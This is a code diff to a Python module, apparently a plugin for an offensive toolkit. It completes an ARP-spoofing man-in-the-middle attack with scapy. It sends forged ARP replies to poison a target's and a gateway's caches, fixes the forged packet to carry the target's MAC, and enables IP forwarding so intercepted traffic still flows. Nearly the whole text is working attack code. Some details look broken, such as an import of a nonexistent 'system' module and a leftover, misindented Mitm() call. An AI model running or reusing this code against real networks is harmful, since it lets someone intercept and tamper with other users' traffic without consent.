@@ -1,4 +1,10 @@
-from .DroneModuleFrame import DroneModuleFrame
+import os
+import sys
+import system
+
+from scapy.all import ARP, arping, Ether, send, sniff
+
+from ..DroneModuleFrame import DroneModuleFrame
 
 class DroneModule(DroneModuleFrame):
 
@@ -13,14 +19,13 @@ class DroneModule(DroneModuleFrame):
         print("I am analyzing stuff")
 
     def Exploit(self):
-        import os
-        import system
-        import scapy.all
-        print("I am exploiting stuff")
+        targetIP = self.options['targetIP']['value']
+        gatewayIP = self.options['gatewayIP']['value']
+        interface = self.options['interface']['value']
 
         ''' Get MACs '''
         def MACgetter(IP):
-            ans,unans = arping(IP)
+            ans,unans = arping(IP, iface=interface)
             for s, r in ans:
                 return r[Ether].src
 
@@ -28,7 +33,7 @@ class DroneModule(DroneModuleFrame):
         def Flood(gatewayIP,targetIP):
             targetMAC = MACgetter(targetIP)
             gatewayMAC = MACgetter(gatewayIP)
-            send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst=targetIP))
+            send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst=targetMAC))
             send(ARP(op=2, pdst=gatewayIP, psrc=targetIP, hwdst=gatewayMAC))
 
         ''' Reupdate routing tables so they can actually use internet '''
@@ -55,5 +60,4 @@ class DroneModule(DroneModuleFrame):
                     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                     sys.exit(1)
 
-    if __name__ == "__main__":
         Mitm()
